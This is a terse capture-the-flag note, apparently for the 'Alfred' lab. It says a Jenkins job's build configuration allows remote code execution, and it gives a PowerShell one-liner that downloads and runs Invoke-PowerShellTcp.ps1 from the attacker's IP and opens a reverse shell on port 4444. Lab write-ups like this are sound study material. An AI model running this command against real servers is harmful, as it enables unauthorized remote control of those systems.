# Alfred

http://10.10.200.120:8080/job/project/configure give RCE with `powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.2.226:9999/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.2.226 -Port 4444` under build.

